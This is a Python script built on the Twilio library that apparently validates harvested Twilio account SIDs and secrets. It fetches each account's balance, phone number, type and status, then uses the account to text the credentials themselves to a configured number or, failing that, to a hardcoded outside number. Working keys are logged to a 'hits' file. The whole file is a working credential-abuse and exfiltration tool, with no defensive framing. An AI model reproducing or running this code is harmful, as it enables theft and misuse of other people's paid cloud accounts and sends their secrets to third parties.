import configparser
from twilio.rest import Client

config = configparser.RawConfigParser()
config.read('settings.cfg')
settings = dict(config.items('DEFAULT'))
send_to = settings['your_phonenumber']


def get_balance(acc_key, acc_sec):
    try:
        client = Client(acc_key, acc_sec)
        balance = client.api.balance.fetch().balance
        currency = client.api.balance.fetch().currency
        waarde = str(balance) + ' ' + str(currency)
        return waarde
    except:
        return "BAD_TWILIO"


def get_phone(acc_key, acc_sec):
    try:
        client = Client(acc_key, acc_sec)
        incoming_phone_numbers = client.incoming_phone_numbers.list(limit=20)
        for record in incoming_phone_numbers:
            return record.phone_number
    except:
        return "BAD_TWILIO"


def get_type(acc_key, acc_sec):
    try:
        client = Client(acc_key, acc_sec)
        acc_type = client.api.account.fetch().type
        return acc_type
    except:
        return "BAD_TWILIO"


def get_status(acc_key, acc_sec):
    try:
        client = Client(acc_key, acc_sec)
        status = client.api.account.fetch().status
        return status
    except:
        return "BAD_TWILIO"


def smsen(acc_key, acc_sec, nummer, build):
    try:
        client = Client(acc_key, acc_sec)
        client.messages.create(
            from_=nummer,
            body=build,
            to=send_to
        )
        twilio_status = "TWILIO_SMS_SEND"
        return twilio_status
    except Exception as e:
        twilio_status = "TWILIO_SMS_FAILED"
        return twilio_status


def smsen2(acc_key, acc_sec, nummer):
    try:
        client = Client(acc_key, acc_sec)
        client.messages.create(
            from_=nummer,
            body="HII THIS IS A TEST",
            to="+12707397227"
        )
        twilio_status = "TWILIO_SMS_SEND"
        return twilio_status
    except Exception as e:
        twilio_status = "TWILIO_SMS_FAILED"
        return twilio_status


def twilio_checker(acc_key, acc_sec):
    try:
        balance = get_balance(acc_key, acc_sec)
        if balance == "BAD_TWILIO":
            return "BAD_TWILIO"
        nummer = get_phone(acc_key, acc_sec)
        types = get_type(acc_key, acc_sec)
        status = get_status(acc_key, acc_sec)
        build = f"TWILIO_SID: {acc_key}\nTWILIO_SECRET: {acc_sec}\nBALANCE: {balance}\nFROM_NUMBER: " \
                f"{nummer}\nTYPE: {types}\nSTATUS: {status}"
        test_sms = smsen(acc_key, acc_sec, nummer, build)
        if test_sms == "TWILIO_SMS_SEND":
            twilio_send = open("Results/TWILIO_SMS_HITS.txt", "a")
            remover = build.replace('\r', '')
            twilio_send.write(remover + "\n\n")
            twilio_send.close()
            return test_sms
        else:
            if test_sms == "TWILIO_SMS_FAILED":
                test_sms2 = smsen2(acc_key, acc_sec, nummer)
                if test_sms2 == "TWILIO_SMS_SEND":
                    twilio_send = open("Results/TWILIO_SMS_HITS.txt", "a")
                    remover = build.replace('\r', '')
                    twilio_send.write(remover + "\n\n")
                    twilio_send.close()
                    return "TWILIO_SMS_SEND"
                else:
                    return "TWILIO_SMS_FAILED"
    except Exception as e:
        twilio_status = "BAD_TWILIO"
        return twilio_status
